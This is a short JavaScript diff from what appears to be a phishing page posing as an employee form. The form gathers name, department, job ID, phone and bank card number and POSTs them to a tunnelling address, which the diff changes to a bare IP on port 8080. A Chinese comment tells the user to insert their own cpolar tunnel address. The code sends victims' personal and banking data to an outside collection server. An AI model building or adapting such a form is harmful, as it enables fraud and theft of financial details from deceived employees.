@@ -223,7 +223,7 @@ function sub() {
     if (!bank) { alert("请输入银行卡号"); return; }
 
     // 这里换成你的 cpolar 地址 + /submit
-    fetch("https://2f391bf9.r18.cpolar.top/submit", {
+    fetch("http://8.133.196.51:8080/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ name, dept, jobid, phone, bank })
